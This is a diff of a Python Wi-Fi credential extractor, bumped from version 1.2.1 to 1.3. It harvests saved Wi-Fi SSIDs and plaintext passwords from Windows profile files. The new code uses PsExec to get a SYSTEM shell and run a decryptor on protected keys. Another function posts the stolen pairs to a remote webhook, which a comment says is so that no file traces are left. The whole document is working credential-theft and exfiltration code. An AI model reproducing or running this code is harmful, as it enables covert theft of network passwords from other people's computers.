@@ -17,7 +17,7 @@ WIFIs = []
 #funcion principal
 def main(url, no_txt, version,print_output):
     if version == True:
-        print('\nWIFI Extractor\n\nVersion 1.2.1\n')
+        print('\nWIFI Extractor\n\nVersion 1.3\n')
         sys.exit()
     elif url != '' and no_txt == True:
         extractor(url, no_txt,print_output)
@@ -29,7 +29,7 @@ def main(url, no_txt, version,print_output):
         urlweb(url)
     else:
         extractor(url,no_txt, print_output)
-        print('\nDone! \n\nHecho!\n')
+        print('\n[*] Done! \n\n[*] Hecho!\n')
 
 #hara el proceso de extraccion
 def extractor(url, no_txt,print_output):
@@ -56,38 +56,65 @@ def extractor(url, no_txt,print_output):
     for archivo in Archivos_XML_WIFI:
         tr = t.parse(archivo)
         rt = tr.getroot()
-        #try que verifica si el xml tiene contrasena extraible
+        #try que verifica si el xml tiene contrasena extraible y si esque esta protegida
         try:
             ssid = rt[1][0][1].text
             contrasena = rt[4][0][1][2].text
             protected = rt[4][0][1][1].text
+            #guarda el ssid y la pass
             ssid_contrasena = f"Nombre/SSID: {ssid} || CONTRASENA/PASSWORD: {contrasena}"
-            
-      
+
+
             conta = conta + 1
+
             if print_output == True:
                 print(f'\n{ssid_contrasena}\n')
                 sleep(0.1)
+
+            #verifica si la wifi esta protegida
             if protected == "true":
-                print("Detected encrypted Wifi do you want to try crack it? (You need authority system for this to be successful) SSID: "+ssid)
+                print("[*] Detected encrypted Wifi do you want to try crack it? (You need admin privileges for this to be successful) SSID: "+ssid)
+                print("[*] Detectado Wifi encriptado, quieres intentar crackearlo? (Necesitas privilegios de administrador para que esto tenga exito) SSID: "+ssid)
                 ans = input("Y/N: ")
                 if ans == "Y" or ans == "y":
-                    subprocess.run(["./Wdecryptor.exe", "--key", contrasena])
-                    # Verificar si el archivo de salida existe
-                    pdecryptedfile = ruta + "/decrypted.txt"
+                    print("\n[*] Trying to get a system shell with the help of PsExec...\n")
+                    print("[*] Tratando de obtener un system shell con la ayuda de PsExec...\n")
+                    sleep(0.7)
+                    # Intentar obtener un shell de sistema con la ayuda de PsExec y ejecutar el wdecryptor
+                    try:
+                        output = subprocess.run(['psexec.exe', '-accepteula', '-s', 'cmd', '/c', 'echo', '"[*]Done!|Hecho!"', '&','whoami'], capture_output=True, text=True, shell=False)
+                        print(output.stdout)
+                        sleep(0.8)
+                        cmd = ['psexec.exe', '-nobanner','-accepteula', '-s', 'cmd', '/c', ruta + '\Wdecryptor.exe', '--key', contrasena]
+                        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+                        # Leer la salida del wdecryptor en tiempo real
+                        for line in iter(p.stdout.readline, b''):
+                            sleep(0.5)
+                            print(line.decode().strip())
+                        # Espera a que el proceso termine
+                        p.wait()
+                        print("\n[*] Done!\n[*] Hecho!\n")
+                    # Si no se pudo obtener un shell de sistema, muestra un mensaje de error
+                    except:
+                        print("[-] Couldn't get a system shell, try running the program as administrator...\n")
+                        print("[-] No se pudo obtener un system shell, intenta ejecutar el programa como administrador...\n")
+                    
+                    # Verifica si el archivo txt con la decryptacion existe
+                    pdecryptedfile = r'C:\Windows\System32\decrypted.txt'
+                     # Verifica si el archivo txt con la decryptacion existe
                     if os.path.isfile(pdecryptedfile):
-                        # Leer el contenido del archivo de salida
+                        # Lee el contenido del archivo
                         with open(pdecryptedfile, 'r') as file:
                             contrasena = file.read()
-                            ssid_contrasena = f"Nombre/SSID: {ssid} || CONTRASENA/PASSWORD: {contrasena}"
+                            ssid_contrasena = f"[+] Nombre/SSID: {ssid} || CONTRASENA/PASSWORD: {contrasena}"
                             
-                        # Eliminar el archivo de salida    
+                        # Elimina el archivo de salida    
                         os.remove(pdecryptedfile)
                 elif ans == "N" or ans == "n":
-                    print("Skipping...")
+                    print("[*] Skipping...")
 
             
-            os.remove(archivo)        
+            #os.remove(archivo)        
             WIFIs.append(ssid_contrasena)
 
             
@@ -98,8 +125,8 @@ def extractor(url, no_txt,print_output):
                 pass
 
         except:
-            print("Omitting detected WIFI without password(Open WIFI) or WIFI with WPA-Enterprise security... SSID: "+ssid+"\nOmitiendo WIFI detectado sin contrasena(WIFI Libre) o con WPA-Enterprise security... SSID: "+ssid+"\n")
-            os.remove(archivo)
+            print("[-] Omitting detected WIFI without password(Open WIFI) or WIFI with WPA-Enterprise security... SSID: "+ssid+"\n[-] Omitiendo WIFI detectado sin contrasena(WIFI Libre) o con WPA-Enterprise security... SSID: "+ssid+"\n")
+            #os.remove(archivo)
 
     try: 
         #cierra el archivo txt
@@ -113,16 +140,16 @@ def urlweb(url):
     #guarda la url de webhook en caso de no querer dejar rastros de archivos y usar webhook para enviar los datos remotamente a nuestro dispositivo
     urlpost = url
     try:
-        print('\nSending... | Enviando...\n')
+        print('\n[+] Sending... | Enviando...\n')
         #envia los datos a la url de webhook
         for i in WIFIs:
             conta = conta + 1
             requests.post(urlpost, data=i)
-            print(f'Sent: {conta} of {len(WIFIs)}\n\nEnviado: {conta} de {len(WIFIs)}\n')
+            print(f'[*] Sent: {conta} of {len(WIFIs)}\n\n[*] Enviado: {conta} de {len(WIFIs)}\n')
             
-        print('\nDone! \n\nHecho!\n')
+        print('\n[*] Done! \n\n[*] Hecho!\n')
     except:
-        print('\n***Error could not send: url not specified or invalid url | url no especificada o es invalida***\n')
+        print('\n[-] ***Error could not send: url not specified or invalid url | url no especificada o es invalida***\n')
         sys.exit()
         
 
